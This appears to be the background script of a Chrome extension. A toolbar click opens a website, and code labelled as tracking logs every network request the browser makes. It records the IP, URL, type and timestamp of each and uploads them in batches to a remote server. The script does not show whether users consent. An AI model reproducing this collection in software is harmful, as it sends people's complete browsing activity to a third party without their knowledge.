chrome.browserAction.onClicked.addListener(function (activeTab) {
    var newURL = "https://mip-tv.mgjm.de";
    chrome.tabs.create({
        url: newURL
    });

});

// Tracking code

// defined constants
var API_SYNC_URL = "https://mip-tv.mgjm.de/v1/upload";
var LOG_SERVER = "188.68.58.69";

// create buffers as global variables
var requestBuffer = [];
var requestPreparedBuffer = [];

function syncBuffer() { // moves primary buffer to secondary buffer and clears; sends data to server
    requestPreparedBuffer = requestBuffer;
    requestBuffer = [];
    var postData = {
        keys: ["ip","url","type","timestamp"],
        entries: requestPreparedBuffer
    };
    var syncRequest = new XMLHttpRequest();
    syncRequest.open("POST", API_SYNC_URL, true);
    syncRequest.send(JSON.stringify(postData));
}
function logRequest(reqDetails) { // writes data of request (reqDetais) formatted to buffer
    if (reqDetails.ip !== LOG_SERVER && reqDetails.ip !== undefined) { // make sure it is not our request (or local request)
        var newEntry = [ // form as array
            reqDetails.ip,
            reqDetails.url,
            reqDetails.type,
            reqDetails.timeStamp
        ];
        requestBuffer.push(newEntry); // write to buffer
        if (requestBuffer.length >= 200) { // buffer over 200 entries -> sync to server
            syncBuffer();
        }
    }
}

// listen for all network requests (all urls), for each -> logRequest()
chrome.webRequest.onResponseStarted.addListener((details)=>{ logRequest(details) }, { urls: ["<all_urls>"] }, []);

setInterval(syncBuffer, 4*60*1000); // sync buffer every 4 minutes
